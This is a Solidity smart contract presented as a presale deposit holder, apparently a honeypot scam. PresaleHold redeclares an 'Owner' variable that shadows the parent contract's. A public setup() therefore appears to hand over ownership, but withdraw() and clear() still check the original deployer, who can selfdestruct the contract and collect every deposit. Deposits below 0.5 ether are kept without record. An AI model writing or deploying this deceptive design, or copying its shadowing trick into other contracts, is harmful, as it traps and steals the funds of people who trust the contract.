1 pragma solidity ^0.4.10;
2 
3 contract Ownable {
4     function isOwner() returns (bool) {
5         if (Owner == msg.sender) return true; return false;
6     }
7     address public Owner = msg.sender;
8     function transferOwner(address _owner) public {
9         if (isOwner()) Owner = _owner;
10     }
11     function clear() public {
12         if (isOwner()) selfdestruct(Owner);
13     }
14 }
15 
16 contract PresaleHold is Ownable {
17     mapping (address => uint) public deposits;
18     uint public openDate;
19     address public Owner;
20     
21     function setup(uint _openDate) public {
22         Owner = msg.sender;
23         openDate = _openDate;
24     }
25     
26     function() public payable {  }
27     
28     function deposit() public payable {
29         if (msg.value >= 0.5 ether) {
30             deposits[msg.sender] += msg.value;
31         }
32     }
33 
34     function withdraw(uint amount) public {
35         if (isOwner() && now >= openDate) {
36             uint max = deposits[msg.sender];
37             if (amount <= max && max > 0) {
38                 msg.sender.transfer(amount);
39             }
40         }
41     }
42 }